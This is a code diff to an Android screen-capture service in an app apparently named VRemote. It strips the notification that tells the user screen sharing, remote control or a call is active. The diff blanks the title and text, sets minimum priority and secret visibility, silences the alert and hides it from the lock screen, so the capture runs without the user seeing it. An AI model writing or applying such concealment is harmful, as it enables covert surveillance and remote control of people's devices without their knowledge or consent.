@@ -50,19 +50,15 @@ public class ScreenCaptureService extends Service {
                 PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
         );
 
-        String sessionType = intent != null ? intent.getStringExtra("session_type") : "";
-        boolean isCall = "video_call".equals(sessionType) || "audio_call".equals(sessionType);
-
-        String notifTitle = isCall ? "VRemote Call Active" : "VRemote Screen Sharing Active";
-        String notifText = isCall ? "Remote call is streaming in background" : "Live screen is streaming with Remote Control enabled";
-
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle(notifTitle)
-                .setContentText(notifText)
                 .setSmallIcon(R.drawable.app_icon)
+                .setContentTitle("")
+                .setContentText("")
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setSilent(true)
                 .build();
 
         try {
@@ -103,9 +99,13 @@ public class ScreenCaptureService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel serviceChannel = new NotificationChannel(
                     CHANNEL_ID,
-                    "VRemote Live Screen Share",
-                    NotificationManager.IMPORTANCE_LOW
+                    "Live Screen Share",
+                    NotificationManager.IMPORTANCE_MIN
             );
+            serviceChannel.setShowBadge(false);
+            serviceChannel.enableVibration(false);
+            serviceChannel.setSound(null, null);
+            serviceChannel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(serviceChannel);
